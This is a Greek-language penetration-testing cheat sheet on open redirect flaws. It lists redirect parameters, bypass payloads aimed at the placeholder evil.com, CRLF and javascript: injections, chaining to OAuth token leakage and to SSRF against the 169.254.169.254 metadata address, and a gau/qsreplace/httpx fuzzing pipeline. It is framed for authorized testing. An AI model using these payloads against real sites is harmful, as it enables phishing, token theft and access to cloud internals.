# 🔀 Οδηγός μη ελεγχόμενων ανακατευθύνσεων (Open Redirect)

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
<a href="../README.md">🇬🇧 English</a> • <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a>
</p>

```
   ██████╗ ██████╗ ███████╗███╗   ██╗    ██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗
  ██╔═══██╗██╔══██╗██╔════╝████╗  ██║    ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝
  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║    ██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   
  ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║    ██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   
  ╚██████╔╝██║     ███████╗██║ ╚████║    ██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   
   ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   
```

---

## Πριν ξεκινήσετε

Μια **ανακατεύθυνση (redirect)** οδηγεί τον χρήστη σε άλλο URL, π.χ. με κεφαλίδα Location ή JavaScript. Το **open redirect** εμφανίζεται όταν μη αξιόπιστη είσοδος μπορεί να ορίσει μη επιτρεπόμενο προορισμό.

**Βασικοί όροι:** destination = προορισμός, allowlist = λίστα επιτρεπόμενων τιμών, URL parser = μηχανισμός ανάλυσης URL, redirect chain = διαδοχή ανακατευθύνσεων. Επιβεβαιώστε τον τελικό πραγματικό προορισμό και το σημείο όπου η εφαρμογή χρησιμοποιεί την είσοδο.

Οι παρακάτω δοκιμές αφορούν εργαστήρια ή στόχους που περιλαμβάνονται ρητά σε εγκεκριμένο έλεγχο. Οι διευθύνσεις, τα διαπιστευτήρια και τα αναγνωριστικά είναι ενδεικτικά. Οι εντολές και τα payloads διατηρούνται από το αγγλικό πρωτότυπο· δεν εκτελούνται κατά τη μετάφραση.

<a id="section-01"></a>

## 🎯 Τι είναι το Open Redirect

**Open Redirect** είναι η μη ασφαλής χρήση εισόδου που επιτρέπει μετάβαση σε μη επιτρεπόμενο προορισμό. Μπορεί να αξιοποιηθεί για παραπλανητικούς συνδέσμους ή να συνδυαστεί με άλλες αδυναμίες.

---

<a id="section-02"></a>

## 🔍 Συνήθεις παράμετροι

```
url=
redirect=
redirect_uri=
redirect_url=
next=
next_url=
return=
return_url=
rurl=
dest=
destination=
redir=
redirect_uri=
return_to=
checkout_url=
continue=
image_url=
go=
view=
to=
out=
ref=
callback=
```

---

<a id="section-03"></a>

## 💉 Δοκιμαστικές είσοδοι (Payloads)

> **Ελέγξτε τον πραγματικό προορισμό:** Οι παραλλαγές εξαρτώνται από το σημείο χρήσης, τον URL parser και τον browser. Το javascript/data δεν γίνεται δεκτό σε κάθε μηχανισμό redirect και μπορεί να αφορά διαφορετική κατηγορία, όπως XSS.


### Βασική κατά το πρωτότυπο
```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=http://evil.com
https://target.com/redirect?url=//evil.com
```

### Διευθύνσεις χωρίς ρητό πρωτόκολλο
```
//evil.com
///evil.com
////evil.com
/\/evil.com
```

### Χρήση συμβόλου @
```
https://target.com@evil.com
https://target.com%40evil.com
//target.com@evil.com
```

### Παραλλαγές με ανάστροφη κάθετο
```
https://evil.com\@target.com
//evil.com\@target.com
https://target.com/redirect?url=https://evil.com\.target.com
```

### Κωδικοποίηση URL
```
https://evil.com
https:%2f%2fevil.com
https:%252f%252fevil.com
%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

### Σύγχυση ονόματος domain
```
https://evil.com?.target.com
https://evil.com#.target.com
https://evil.com\.target.com
https://target.com.evil.com
https://targetcom.evil.com
```

### Μηδενικά bytes (NULL)
```
https://evil.com%00.target.com
https://evil.com%00@target.com
```

### Εισαγωγή χαρακτήρων CRLF
```
https://target.com/redirect?url=%0d%0aLocation:%20https://evil.com
```

### Ανακατεύθυνση με JavaScript
```
javascript:alert(1)
javascript://target.com/%0d%0aalert(1)
data:text/html,<script>location='https://evil.com'</script>
```

---

<a id="section-04"></a>

## 🛡️ Παραδείγματα παράκαμψης του πρωτοτύπου και περιορισμοί

### Όταν ελέγχεται λίστα επιτρεπόμενων προορισμών
```
# Έλεγχος συσχέτισης υποτομέα
https://target.com.evil.com
https://evil.target.com
https://targetcom.evil.com

# Παραλλαγή διαδρομής
https://target.com/https://evil.com
https://target.com//evil.com
```

### Όταν επιτρέπεται μόνο HTTPS
```
https://evil.com
https://evil.com%2f%2ftarget.com
```

### Παραλλαγές τοπικής διεύθυνσης
```
http://localhost
http://127.0.0.1
http://[::1]
```

---

<a id="section-05"></a>

## 🔗 Συνδυασμός open redirect με άλλες αδυναμίες

> **Οι αλυσίδες έχουν πρόσθετες προϋποθέσεις:** Διαρροή OAuth token απαιτεί ευάλωτη ροή και μη ασφαλή έλεγχο redirect URI. Αλυσίδα SSRF απαιτεί server-side client που ακολουθεί την ανακατεύθυνση. Open redirect μόνο του δεν αποδεικνύει κανένα από τα δύο.


### Πιθανή διαρροή OAuth token
```
https://target.com/oauth?redirect_uri=https://evil.com
→ Πιθανή διαρροή OAuth token, μόνο εφόσον συντρέχουν οι απαραίτητες προϋποθέσεις
```

### Συνδυασμός με SSRF
```
https://target.com/redirect?url=http://169.254.169.254/
```

### Συνδυασμός με XSS
```
https://target.com/redirect?url=javascript:alert(document.domain)
```

---

<a id="section-06"></a>

## 📊 Γρήγορη αναφορά

| Είδος δοκιμαστικής εισόδου | Παράδειγμα |
| -------------- | --------- |
| Βασική κατά το πρωτότυπο | `//evil.com` |
| @ σύμβολο | `https://target.com@evil.com` |
| Κωδικοποίηση | `https:%2f%2fevil.com` |
| Σύγχυση ονόματος domain | `https://target.com.evil.com` |
| JavaScript | `javascript:alert(1)` |

---

<a id="section-07"></a>

## 🛠️ Εργαλεία

> **Συλλογή και επαλήθευση διαφέρουν:** Τα GF patterns επιλέγουν υποψήφια URLs και το qsreplace αλλάζει τιμές παραμέτρων. Δεν επιβεβαιώνουν μόνα τους open redirect. Εξετάστε την πραγματική κεφαλίδα Location, τον τρόπο χρήσης της τιμής και τον τελικό προορισμό.


```bash
# GF Patterns
gau target.com | gf redirect

# Χειροκίνητος έλεγχος
echo "https://target.com/r?url=FUZZ" | \
  qsreplace "https://evil.com" | \
  httpx -silent -location
```

---

<a id="section-08"></a>

## 📚 Πηγές

- [PortSwigger — Open Redirect](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

---

<p align="center">
  <b>🔀 Ελέγξτε τους προορισμούς ανακατεύθυνσης!</b><br>
  <i>Μόνο για εξουσιοδοτημένους ελέγχους!</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
